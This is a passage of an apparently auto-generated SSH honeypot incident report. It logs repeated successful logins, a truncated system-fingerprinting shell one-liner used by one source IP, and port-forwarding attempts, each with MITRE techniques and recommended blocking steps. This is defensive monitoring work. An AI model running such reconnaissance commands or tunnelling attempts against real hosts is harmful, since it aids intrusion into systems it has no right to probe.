| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:00 |
| **Last Seen** | 2026-07-11 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:00:44` | `cowrie.session.connect` |
| `2026-07-11 07:00:45` | `cowrie.client.version` |
| `2026-07-11 07:00:45` | `cowrie.client.kex` |
| `2026-07-11 07:00:45` | `cowrie.login.success` |
| `2026-07-11 07:00:46` | `cowrie.session.params` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.success` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:46` | `cowrie.command.input` |
| `2026-07-11 07:00:47` | `cowrie.log.closed` |
| `2026-07-11 07:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fab5ee4259e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:02 |
| **Last Seen** | 2026-07-11 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:02:25` | `cowrie.session.connect` |
| `2026-07-11 07:02:25` | `cowrie.client.version` |
| `2026-07-11 07:02:25` | `cowrie.client.kex` |
| `2026-07-11 07:02:26` | `cowrie.login.success` |
| `2026-07-11 07:02:27` | `cowrie.session.params` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.success` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:27` | `cowrie.command.input` |
| `2026-07-11 07:02:28` | `cowrie.log.closed` |
| `2026-07-11 07:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c49ffc7619

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:04 |
| **Last Seen** | 2026-07-11 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:04:07` | `cowrie.session.connect` |
| `2026-07-11 07:04:07` | `cowrie.client.version` |
| `2026-07-11 07:04:07` | `cowrie.client.kex` |
| `2026-07-11 07:04:08` | `cowrie.login.success` |
| `2026-07-11 07:04:09` | `cowrie.session.params` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.success` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.command.input` |
| `2026-07-11 07:04:09` | `cowrie.log.closed` |
| `2026-07-11 07:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e35257e20ef

| Field | Detail |
|---|---|
| **Source IP** | `34.77.62[.]182` |
| **First Seen** | 2026-07-11 07:05 |
| **Last Seen** | 2026-07-11 07:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:05:29` | `cowrie.session.connect` |
| `2026-07-11 07:05:29` | `cowrie.login.success` |
| `2026-07-11 07:05:30` | `cowrie.session.params` |
| `2026-07-11 07:05:30` | `cowrie.command.input` |
| `2026-07-11 07:05:30` | `cowrie.command.input` |
| `2026-07-11 07:05:30` | `cowrie.command.failed` |
| `2026-07-11 07:05:30` | `cowrie.command.input` |
| `2026-07-11 07:05:30` | `cowrie.log.closed` |
| `2026-07-11 07:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.62[.]182` to AbuseIPDB if not already reported
- [ ] Block `34.77.62[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5e1a88ab5e

| Field | Detail |
|---|---|
| **Source IP** | `34.77.62[.]182` |
| **First Seen** | 2026-07-11 07:05 |
| **Last Seen** | 2026-07-11 07:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:05:43` | `cowrie.session.connect` |
| `2026-07-11 07:05:43` | `cowrie.login.success` |
| `2026-07-11 07:05:44` | `cowrie.session.params` |
| `2026-07-11 07:05:44` | `cowrie.command.input` |
| `2026-07-11 07:05:44` | `cowrie.command.failed` |
| `2026-07-11 07:05:48` | `cowrie.log.closed` |
| `2026-07-11 07:05:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.62[.]182` to AbuseIPDB if not already reported
- [ ] Block `34.77.62[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-036bccc3d56b

| Field | Detail |
|---|---|
| **Source IP** | `34.77.62[.]182` |
| **First Seen** | 2026-07-11 07:05 |
| **Last Seen** | 2026-07-11 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:05:45` | `cowrie.session.connect` |
| `2026-07-11 07:05:45` | `cowrie.login.success` |
| `2026-07-11 07:05:45` | `cowrie.session.params` |
| `2026-07-11 07:05:45` | `cowrie.command.input` |
| `2026-07-11 07:05:48` | `cowrie.log.closed` |
| `2026-07-11 07:05:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.62[.]182` to AbuseIPDB if not already reported
- [ ] Block `34.77.62[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22a50172c2ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:05 |
| **Last Seen** | 2026-07-11 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:05:47` | `cowrie.session.connect` |
| `2026-07-11 07:05:47` | `cowrie.client.version` |
| `2026-07-11 07:05:47` | `cowrie.client.kex` |
| `2026-07-11 07:05:48` | `cowrie.login.success` |
| `2026-07-11 07:05:49` | `cowrie.session.params` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.success` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.command.input` |
| `2026-07-11 07:05:49` | `cowrie.log.closed` |
| `2026-07-11 07:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6def9e9ea8ae

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-07-11 07:06 |
| **Last Seen** | 2026-07-11 07:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:06:38` | `cowrie.session.connect` |
| `2026-07-11 07:06:38` | `cowrie.client.version` |
| `2026-07-11 07:06:38` | `cowrie.client.kex` |
| `2026-07-11 07:06:39` | `cowrie.login.success` |
| `2026-07-11 07:06:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7653a8f26185

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-11 07:06 |
| **Last Seen** | 2026-07-11 07:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:06:45` | `cowrie.session.connect` |
| `2026-07-11 07:06:45` | `cowrie.client.version` |
| `2026-07-11 07:06:45` | `cowrie.client.kex` |
| `2026-07-11 07:06:47` | `cowrie.login.success` |
| `2026-07-11 07:06:47` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192e385c509a

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-07-11 07:07 |
| **Last Seen** | 2026-07-11 07:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:07:23` | `cowrie.session.connect` |
| `2026-07-11 07:07:23` | `cowrie.client.version` |
| `2026-07-11 07:07:23` | `cowrie.client.kex` |
| `2026-07-11 07:07:25` | `cowrie.login.success` |
| `2026-07-11 07:07:26` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-571d760eeeee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:07 |
| **Last Seen** | 2026-07-11 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:07:33` | `cowrie.session.connect` |
| `2026-07-11 07:07:33` | `cowrie.client.version` |
| `2026-07-11 07:07:33` | `cowrie.client.kex` |
| `2026-07-11 07:07:34` | `cowrie.login.success` |
| `2026-07-11 07:07:35` | `cowrie.session.params` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.success` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.command.input` |
| `2026-07-11 07:07:35` | `cowrie.log.closed` |
| `2026-07-11 07:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c75c5796492b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:09 |
| **Last Seen** | 2026-07-11 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:09:19` | `cowrie.session.connect` |
| `2026-07-11 07:09:19` | `cowrie.client.version` |
| `2026-07-11 07:09:19` | `cowrie.client.kex` |
| `2026-07-11 07:09:19` | `cowrie.login.success` |
| `2026-07-11 07:09:20` | `cowrie.session.params` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.success` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.command.input` |
| `2026-07-11 07:09:20` | `cowrie.log.closed` |
| `2026-07-11 07:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de6d60d7c78

| Field | Detail |
|---|---|
| **Source IP** | `103.250.160[.]76` |
| **First Seen** | 2026-07-11 07:10 |
| **Last Seen** | 2026-07-11 07:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:10:16` | `cowrie.session.connect` |
| `2026-07-11 07:10:16` | `cowrie.client.version` |
| `2026-07-11 07:10:16` | `cowrie.client.kex` |
| `2026-07-11 07:10:18` | `cowrie.login.success` |
| `2026-07-11 07:10:19` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.160[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.250.160[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ece1d0c0b7a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-11 07:10 |
| **Last Seen** | 2026-07-11 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:10:18` | `cowrie.session.connect` |
| `2026-07-11 07:10:18` | `cowrie.client.version` |
| `2026-07-11 07:10:18` | `cowrie.client.kex` |
| `2026-07-11 07:10:19` | `cowrie.login.success` |
| `2026-07-11 07:10:19` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:10:19` | `cowrie.direct-tcpip.ja4` |
| `2026-07-11 07:10:19` | `cowrie.direct-tcpip.data` |
| `2026-07-11 07:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffaf9a6f9ca4

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-07-11 07:10 |
| **Last Seen** | 2026-07-11 07:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:10:57` | `cowrie.session.connect` |
| `2026-07-11 07:10:58` | `cowrie.client.version` |
| `2026-07-11 07:10:58` | `cowrie.client.kex` |
| `2026-07-11 07:11:01` | `cowrie.login.success` |
| `2026-07-11 07:11:01` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e14e4a9eb6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:11 |
| **Last Seen** | 2026-07-11 07:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:11:09` | `cowrie.session.connect` |
| `2026-07-11 07:11:09` | `cowrie.client.version` |
| `2026-07-11 07:11:09` | `cowrie.client.kex` |
| `2026-07-11 07:11:09` | `cowrie.login.success` |
| `2026-07-11 07:11:10` | `cowrie.session.params` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.success` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:10` | `cowrie.command.input` |
| `2026-07-11 07:11:11` | `cowrie.log.closed` |
| `2026-07-11 07:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59069660d7fa

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-07-11 07:11 |
| **Last Seen** | 2026-07-11 07:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:11:11` | `cowrie.session.connect` |
| `2026-07-11 07:11:12` | `cowrie.client.version` |
| `2026-07-11 07:11:12` | `cowrie.client.kex` |
| `2026-07-11 07:11:14` | `cowrie.login.success` |
| `2026-07-11 07:11:14` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23807ff19d22

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:12 |
| **Last Seen** | 2026-07-11 07:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
